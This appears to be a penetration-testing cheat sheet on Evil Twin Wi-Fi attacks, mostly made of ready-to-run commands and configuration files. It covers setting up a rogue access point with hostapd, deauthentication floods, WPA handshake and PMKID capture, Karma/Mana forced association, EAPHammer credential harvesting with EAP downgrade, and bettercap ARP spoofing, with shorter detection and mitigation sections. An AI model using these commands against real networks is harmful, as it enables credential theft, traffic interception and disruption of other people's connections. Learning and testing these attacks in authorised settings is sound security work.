# 🎭 Evil Twin (Impersonation + Phishing)

> An Evil Twin attack sets up a fake access point with the same SSID as a legitimate network to trick clients into connecting. The goal is to **intercept traffic, harvest credentials**, or perform a Man-in-the-Middle (MitM) attack.

## 🛠️ Tools

- [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) - Multi-use bash script for audit, includes Evil Twin attacks.
- [mana-toolkit](https://github.com/sensepost/mana) - Rogue AP toolkit with advanced phishing capabilities.
- [hostapd](https://w1.fi/hostapd/) - Userspace daemon for AP and authentication servers.
- [EAPHammer](https://github.com/sensepost/EAPHammer) - Toolkit for performing Evil Twin attacks against WPA2-Enterprise networks.
- [EvilTwinX](https://github.com/devsharma-soc/EvilTwinX) - Automated Evil Twin framework with captive portal.

## Description

An Evil Twin attack involves creating a malicious access point that impersonates a legitimate Wi-Fi network. The attacker uses the same SSID (network name) and often the same BSSID if possible. Victims connect to the fake AP, allowing the attacker to:

- **Intercept Traffic**: Capture all data transmitted by the victim.
- **Harvest Credentials**: Present a fake login page (captive portal) to steal usernames and passwords.
- **Perform MitM Attacks**: Modify or inject data into the victim's traffic.

> The attack is **purely over the air**. The attacker does **not** have physical access to the legitimate network.

## Detection

### Manual Discovery

| Tool            | Command                                              | Description                                  |
| --------------- | ---------------------------------------------------- | -------------------------------------------- |
| **Kismet**      | `kismet -c wlan0mon`                                 | Detect duplicate SSIDs / spoofed BSSIDs.     |
| **Wireshark**   | `wlan.fc.type_subtype == 8 && wlan.ssid == "<SSID>"` | Filter for Beacon frames of a specific SSID. |
| **airodump-ng** | `sudo airodump-ng --bssid <BSSID> -c <CH> wlan0mon`  | Compare signal strength of duplicate APs.    |

### Automated Detection

- **WIDS/WIPS**: Systems can detect Evil Twin by analyzing Beacon frame parameters (SSID, channel, encryption).
- **Signal Strength Analysis**: The Evil Twin AP often has a stronger signal than the legitimate one to attract victims.
- **Channel Hopping**: The legitimate AP is usually on a fixed channel; the Evil Twin may be on a different one.

## Setup AP Mode

::: details

```bash
# Set interface to AP (master) mode
sudo iw dev wlan0 set type ap

# Verify mode
sudo iw dev wlan0 info

# Create hostapd config file
cat > /tmp/evil.conf << EOF
interface=wlan0
driver=nl80211
ssid=TARGET_SSID
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=FAKE_PASSWORD
rsn_pairwise=CCMP
EOF

# Start the Evil Twin AP
sudo hostapd /tmp/evil.conf
```

:::

## 🎣 Phishing (Captive Portal)

Present a fake login page to harvest credentials from victims.

```bash
# Using airgeddon (interactive)
sudo ./airgeddon.sh -> Evil Twin -> Captive Portal

# Using EvilTwinX framework
sudo ./eviltwinx.sh

# Manual setup with hostapd + dnsmasq + lighttpd
# Configure hostapd for the AP, dnsmasq for DHCP, and lighttpd for the captive portal
```

### Deauthentication (Force Clients to Connect)

::: code-group

```bash [aireplay-ng]
# Broadcast deauth to all clients of the AP
sudo aireplay-ng -0 0 -a $bssid wlan0mon
```

```bash [mdk4]
# Deauth all clients from a specific AP (unlimited speed)
sudo mdk4 wlan0mon d -B $bssid
# Deauth with stealth mode (faster)
sudo mdk4 wlan0mon d -B $bssid -x
```

:::

## 🔓 Handshake Capture (Offline Cracking)

Capture the WPA/WPA2 handshake to crack it offline using dictionary or brute-force.

```bash
# Start capturing packets on the target channel
sudo airodump-ng -c <CH> --bssid $bssid -w capture wlan0mon

# Force reconnection to capture the handshake
sudo aireplay-ng -0 5 -a $bssid -c $client_mac wlan0mon

# PMKID capture (no client needed)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
```

Check this [cheasheet](../wpa-wpa2/wpa-wpa2-eap.md) to view more commands.

## 📡 Karma / Mana (Forced Association)

The Karma/Mana attack responds to all probe requests, making clients connect to your AP even if they've never associated with it before.

```bash
# Using hostapd-mana (mana option enabled)
sudo hostapd-mana evil.conf

# Using berate-ap
sudo berate_ap --mana wlan0 eth0 TARGET_SSID

# Using airgeddon (Karma mode)
sudo ./airgeddon.sh -> Evil Twin -> Karma Attack
```

### hostapd-mana Config File

::: details

```ini
interface=wlan0
ssid=TARGET_SSID
channel=6
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/path/to/output.hccapx
mana_credout=/path/to/creds.txt
```

:::

## 🏢 WPA-Enterprise (Credential Harvesting)

For corporate networks using RADIUS authentication, set up a fake RADIUS server to intercept enterprise credentials.

```bash
# Using EAPHammer
git clone https://github.com/sensepost/EAPHammer.git
cd EAPHammer
sudo python eaphammer.py --interface wlan0 --essid TARGET_SSID --creds

# Using hostapd-mana with EAP
sudo hostapd-mana -e /path/to/eap_users evil.conf

# Using airgeddon (Enterprise mode)
sudo ./airgeddon.sh -> Evil Twin -> Enterprise
```

### EAP Downgrade Attack

Force PEAP/TTLS clients to use insecure inner methods (e.g., GTC) to capture credentials in plaintext.

```bash
sudo python eaphammer.py --interface wlan0 --essid TARGET_SSID --creds --eap-downgrade
```

## 🔍 Packet Analysis (MitM / Sniffing)

Intercept and analyze traffic from connected victims.

```bash
# Capture traffic with tcpdump
sudo tcpdump -i wlan0 -w capture.pcap

# View in Wireshark
sudo wireshark capture.pcap

# SSL stripping (force HTTP)
sudo bettercap -eval "set arp.spoof.targets <VICTIM_IP>; arp.spoof on; net.sniff on"
```

## Post-Attack

### Credential Harvesting Output

| Tool             | Output File            | Format                |
| ---------------- | ---------------------- | --------------------- |
| **hostapd-mana** | `mana_credout`         | Plaintext credentials |
| **airgeddon**    | `handshake/` directory | `.cap` / `.hccapx`    |
| **EAPHammer**    | `credentials.log`      | Plaintext credentials |

## 🛡️ Mitigation

- **Certificate Validation**: Use EAP-TLS with client certificates for WPA-Enterprise.
- **Wi-Fi Protected Access 3 (WPA3)**: WPA3 includes protections against Evil Twin attacks.
- **User Education**: Train users to verify certificate fingerprints and check for valid SSL certificates on login pages.
- **Network Monitoring**: Use WIDS/WIPS to detect duplicate SSIDs and rogue APs.
